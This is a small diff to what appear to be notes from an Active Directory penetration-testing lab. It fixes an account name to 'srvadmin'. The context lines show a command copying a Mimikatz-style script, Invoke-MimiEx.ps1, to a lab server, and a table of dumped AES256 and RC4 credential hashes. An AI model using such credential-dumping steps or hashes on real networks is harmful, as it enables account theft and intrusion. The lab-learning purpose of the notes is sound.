@@ -304,7 +304,7 @@ Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.lo
 | aes256_hmac | 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb |
 | rc4_hmac_nt | d549831a955fee51a43c83efb3928fa7                                 |
 
-`rvadmin`
+`srvadmin`
 
 | Type        | Hash                                                             |
 | ----------- | ---------------------------------------------------------------- |
